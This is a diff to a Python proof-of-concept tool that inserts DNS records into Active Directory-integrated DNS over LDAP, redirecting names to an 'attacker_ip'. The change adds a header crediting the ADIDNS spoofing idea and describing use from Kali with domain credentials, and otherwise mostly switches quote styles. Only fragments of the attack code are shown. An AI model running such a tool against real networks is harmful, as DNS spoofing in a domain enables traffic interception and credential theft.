@@ -1,3 +1,11 @@
+# The original idea was written by Kevin Robertson at https://blog.netspi.com/exploiting-adidns, so
+# all the credits goes for him.
+#
+# This is just a simple PoC based on that idea, but instead of PowerShell, it uses Python, for being
+# of help for those escenarios where you have a Domain User credentials but don't have access to 
+# a Windows box on the network and prefer to continue with your beloved Kali box.
+# 
+
 import sys
 import imp
 import logging
@@ -17,7 +25,7 @@ try:
     from ldap3 import Server, Connection
     from ldap3 import ALL, NTLM, KERBEROS, SASL, AUTO_BIND_NONE, SUBTREE, ALL_ATTRIBUTES
 except ImportError:
-    print "[-] The required module ldap3 is not available. Please install it and try again."
+    print '[-] The required module ldap3 is not available. Please install it and try again.'
     sys.exit(1)
 
 
@@ -26,7 +34,7 @@ class DNSRecord():
         'A': 0x0001,
         0x0001: 'A'
     }
-    unsupported_type = "UNSUPPORTED_TYPE"
+    unsupported_type = 'UNSUPPORTED_TYPE'
 
     def __init__(self, data, dns_server, zone, static=False):
         self.data_length = struct.pack('<H', 0x0004)		  # DataLength (2 bytes) = length in bytes of the DATA field
@@ -286,10 +294,10 @@ class LdapManager():
             return False
 
         if self._conn.result['description'] == 'noSuchObject':
-            print "[*] The specified object does not exist."
+            print '|[*] The specified object does not exist.'
             return False
         else:
-            print "[*] The object was successfully removed."
+            print '[*] The object was successfully removed.'
             return True
         
     def add_dns_node(self, domain, dns_server, name, attacker_ip):
@@ -318,17 +326,17 @@ class LdapManager():
             return False
         
         if self._conn.result['description'] == 'noSuchObject':
-            print "[*] The specified object does not exist."
+            print '[*] The specified object does not exist.'
             return False
         else:
-            print "[*] The object was successfully added."
+            print '[*] The object was successfully added.'
             return True      
 
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     import argparse, re
 
-    custom_usage = "python %s [options]" % (sys.argv[0].split('/')[-1])
+    custom_usage = 'python %s [options]' % (sys.argv[0].split('/')[-1])
     parser = argparse.ArgumentParser(add_help = True, usage=custom_usage, 
                                      description = 'Inserts DNS records via LDAP on AD.',
                                      epilog = 'Happy hunting!')
@@ -365,7 +373,7 @@ if __name__ == "__main__":
     
     # Evaluate if the target dns is an IP or a name
     attacker_ip = options.ip
-    if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", attacker_ip):
+    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', attacker_ip):
         logging.debug('[D] Provided attacker ip is a valid IP address (%s).' % attacker_ip)
     else:
         logging.debug('[D] Provided attacker ip is not a valid IP address, cannot continue.')
@@ -387,7 +395,7 @@ if __name__ == "__main__":
         ldap_access = LdapManager(dc, ntuser=domain_username, ntpass=password)
 
     if not ldap_access.connect():
-        logging.info("[*] An error ocurred when connecting to the LDAP server.")
+        logging.info('[*] An error ocurred when connecting to the LDAP server.')
         sys.exit(1)
 
     dns_record_list = ldap_access.get_dns_node_info(domain, options.name)
